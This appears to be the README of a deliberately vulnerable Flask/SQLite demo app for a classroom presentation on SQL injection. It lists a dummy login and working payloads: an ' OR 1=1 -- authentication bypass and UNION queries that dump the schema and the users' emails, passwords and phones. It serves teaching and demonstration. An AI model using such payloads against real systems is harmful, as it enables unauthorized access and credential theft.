
# Basic SQL Injection Demo
A simple web application to demonstrate basic level SQL Injection attack manually for the presentation. Some main functions: log-in, find the items with a search bar.

### Prerequisites
- Flask, Python, SQLite

### Attack
Login with a dummy account:
```
Email: minh@gmail.com
Pass: 12345
```
##### Login Form
- Blind SQLi: Perform in the log-in form with the Boolean-based SQLi technique to force the query always return TRUE in order to bypass authentication.
```
' OR 1=1 --
```
##### Search bar
-	In-band SQLi: Perform in the search bar with UNION-based SQLi technique to combine the query result to get unauthorized data from the database.
```
' UNION SELECT sqlite_version(), 2, 3 --
```
```
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table'--
```
```
' UNION SELECT email, password, phone  FROM users -- 
```
